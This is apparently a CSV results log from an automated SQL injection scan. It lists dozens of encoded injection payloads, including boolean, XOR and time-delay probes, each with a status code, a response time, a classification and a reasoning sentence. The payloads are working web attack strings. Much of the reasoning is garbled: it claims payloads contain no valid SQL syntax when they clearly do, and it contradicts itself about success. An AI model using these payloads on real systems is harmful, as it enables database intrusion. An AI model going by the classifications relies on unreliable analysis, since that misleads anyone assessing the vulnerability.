payload,status,elapsed,classification,reasoning
id'/**/OR/**/'a'>'a'#,200,0.03,No Effect,"The payload does not contain any valid SQL syntax and the target application is returning a valid HTML response, indicating that no SQL injection occurred."
ID%27 || %27A%27=%27A%27--,200,0.02,No Effect,"The payload does not contain any valid SQL syntax and the target application is returning a valid HTML page, indicating that the injection attempt was unsuccessful."
id%27%09%26%26%09WAITFOR%09DELAY%09%270%3A0%3A5%27--,200,0.02,No Effect,"The payload does not contain any SQL syntax and the response contains only HTML content, indicating that the application is not vulnerable to SQL injection."
id%27%20XOR%201%3D1/*,200,0.03,No Effect,The payload does not contain any valid SQL syntax and the application is not vulnerable to this type of attack.
ID' AND 1%3D1/*,200,0.02,Error-based SQL Injection,The response contains an error message indicating a syntax error in the SQL query on line 194 of MySQLHandler.php. The payload is not successful and fails to execute the desired action.
id%27/**/XOR/**/WAITFOR/**/DELAY/**/%270:0:5%27--+,200,0.02,No Effect,The payload does not contain any valid SQL syntax and the application is not vulnerable to this type of attack.
id%27 && 1LIKE1/*,200,0.02,No Effect,"The payload does not contain any valid SQL syntax and the application is able to handle it, therefore no effect is achieved."
id%27 && %27a%27LIKE%27a%27#,200,0.02,No Effect,"The payload does not contain any valid SQL syntax and the target application is returning a valid HTML page, indicating that the injection attempt was unsuccessful."
id' aNd 'A'IN'a'--,200,0.02,Error-based SQL Injection,"The response contains an error message indicating a syntax error in the SQL query on line 194 of MySQLHandler.php. This suggests that the payload was not successfully executed, and an error occurred during the query execution."
ID%27%20OR%20PG_SLEEP%285%29--,200,0.02,No Effect,The payload does not contain any valid SQL syntax and the application is not vulnerable to this type of attack.
ID%27 AND SLEEP(5)/*!,200,0.02,No Effect,The payload does not contain any valid SQL syntax and the target application is not vulnerable to this type of attack.
id%2527%2520AND%2520%2527a%2527IN%2527a%2527#,200,0.02,No Effect,"The payload does not contain any SQL syntax and the response contains a valid HTML document, indicating that no SQL injection attempt was successful."
id%27%20%7C%7C%20WAITFOR%20DELAY%20%270%3A0%3A5%27--,200,0.02,No Effect,"The payload does not contain any SQL syntax and the response contains only HTML content, indicating that the application is not vulnerable to SQL injection."
id%27%20AND%201lIkE1/*,200,0.02,No Effect,"The payload does not contain any valid SQL syntax and the application is returning a proper HTML response, indicating that no SQL injection attack was successful."
ID' XOR 1=1#,200,0.03,No Effect,"The payload does not contain any valid SQL syntax and the target application is returning a valid HTML page, indicating that no SQL injection occurred."
Id' xoR waitFOR dElAY '0:0:5'/*,200,0.02,Error-based SQL Injection,"The payload caused a syntax error in the SQL query, resulting in an error message being displayed to the user. This suggests that the application is not properly sanitizing user input and is vulnerable to SQL injection attacks."
id%27	XOR	1IN1/*!,200,0.02,No Effect,"The payload does not contain any valid SQL syntax and the application is returning a proper HTML response, indicating that no SQL injection attack was successful."
id%27%20%7C%7C%20BENCHMARK%2810000000%2CMD5%28NOW%28%29%29%29--,200,0.02,No Effect,"The payload does not contain any valid SQL syntax and the application is returning a HTML page, indicating that it did not execute the payload as a SQL query."
id'	||	'a'%3D'a'--,200,0.02,Error-based SQL Injection,"The payload caused a syntax error in the SQL query, resulting in an error message being displayed to the user."
id' and 1like1/*,200,0.02,Error-based SQL Injection,"The payload contains a syntax error in the WHERE clause of the SQL query, which is causing the error message 'You have an error in your SQL syntax' to be displayed. The response time is also very fast, indicating that the application is not taking sufficient measures to prevent SQL injection attacks."
Id' oR SleEP(5)--+,200,0.1,Error-based SQL Injection,"The payload contains a syntax error in the SELECT statement, which is causing an error message to be displayed to the user. This indicates that the application is vulnerable to error-based SQL injection attacks."
ID' && 'A'<'a'/*,200,0.02,Error-based SQL Injection,"The payload caused a syntax error in the SQL query, which resulted in an exception being thrown. The response body contains detailed error messages and stack traces that indicate an SQL injection vulnerability."
id%27%20AND%20%27a%27IN%27a%27/*,200,0.02,No Effect,"The payload does not contain any valid SQL syntax and the application is able to handle it, therefore no effect is achieved."
id'%20&&%20pg_sleep(5)/*,200,0.02,Error-based SQL Injection,"The payload contains a syntax error in the WHERE clause of the SQL query, which caused an error message to be displayed in the response body."
id'/**/OR/**/'a'!='a'/*,200,0.02,Error-based SQL Injection,"The payload caused a syntax error in the SQL query, resulting in an error message being displayed to the user."
id%27 XOR 1%3D1/*,200,0.02,No Effect,"The payload does not contain any valid SQL syntax and the application is returning a proper HTML response, indicating that no SQL injection attack was successful."
Id' || 'a'<'A'#,200,0.02,No Effect,"The payload does not contain any valid SQL syntax and the application is returning a proper HTML response, indicating that no SQL injection was performed."
Id' Xor 'A'<'a'--+,200,0.02,Error-based SQL Injection,"The response contains an error message indicating a syntax error in the SQL query on line 194 of MySQLHandler.php. The payload contains a single quote mark (') which is not properly escaped, causing the error."
id' AND 1>1#,200,0.02,No Effect,"The payload does not contain any valid SQL syntax and the target application is returning a valid HTML page, indicating that no SQL injection occurred."
ID%27%20%26%26%20%27A%27%3E%27A%27--+,200,0.02,No Effect,"The payload does not contain any valid SQL syntax and the application is returning a HTML page, indicating that it did not execute the payload as a SQL query."
ID'/**/||/**/1<>1/*,200,0.02,Error-based SQL Injection,"The payload caused an error in the SQL query, which resulted in a response with an error message. The response body contained information about the error, including the line number and file path of the MySQLHandler.php file."
id%27%20%7C%7C%201like1--+,200,0.02,No Effect,"The payload does not contain any valid SQL syntax and the application is returning a standard HTML page, indicating that no database interaction occurred."
id' xor waitfor delay '0:0:5'#,200,0.03,Error-based SQL Injection,"The payload contains an error in the SQL syntax, which is causing a failure in executing the query. The error message 'You have an error in your SQL syntax...' indicates that the application is vulnerable to SQL injection."
id%27/%2A%2A/%26%26/%2A%2A/%27a%27IN%27a%27/*!,200,0.02,No Effect,"The payload does not contain any valid SQL syntax and the response contains a fully rendered HTML page, indicating that the application is properly handling the injection attempt."
id%27%20or%20%27a%27%21%3D%27a%27#,200,0.02,No Effect,The payload does not contain any malicious code or syntax errors that could cause an effect on the target application. It appears to be a randomly generated string of characters without any specific pattern.
id%27 XOr 1=1/*,200,0.02,No Effect,"The payload does not contain any valid SQL syntax and the application is returning a complete HTML page, indicating that it is not vulnerable to this type of attack."
